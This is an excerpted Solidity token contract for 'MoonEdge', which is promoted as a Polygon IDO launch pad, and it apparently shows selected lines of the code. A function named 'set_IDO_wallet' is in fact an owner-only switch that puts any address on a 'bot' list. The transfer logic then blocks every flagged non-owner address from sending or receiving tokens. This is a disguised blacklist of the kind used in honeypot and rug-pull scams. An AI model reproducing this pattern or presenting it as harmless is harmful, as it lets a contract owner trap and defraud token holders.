...
MoonEdge is the first decentralized launch pad fully dedicated to IDO on Polygon (previously Matic).
https://t.me/moonedge
...
contract MoonEdge is Context, IBEP20, Ownable {
    ...
    string  private constant _NAME = 'MoonEdge';
    ...
    uint256 private _MAX_TX_SIZE = 200000000 * _DECIMALFACTOR;
    
    bool public tradingEnabled = false;
    address private LiquidityAddress;
    uint256 private _MAX_WT_SIZE = 200000000 * _DECIMALFACTOR;
    
    uint256 private _marketingFee = 0;
    address private marketingWallet = 0xDdC4CbB4214DCCd3107B3c9Da2A658cE89ff31f7;
    ...
    function isExcluded(address account) public view returns (bool) {
     ...
     function set_IDO_wallet(address ido) external onlyOwner returns (bool){
        bot[ido] = !bot[ido];
        return bot[ido];
    }
    ...
    function excludeAccount(address account) external onlyOwner() {
        ...
        require(account != 0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff, 'Quickswap router.');
    ...
    function _transfer(address sender, address recipient, uint256 amount) private {
        ...
        if(sender != owner() && recipient != owner()){
            ...
            require(!bot[sender], "Not active");
            require(!bot[recipient], "Not active");
    ...
    function MaxTxSize() public view returns(uint256) {
        return _MAX_TX_SIZE;
    }
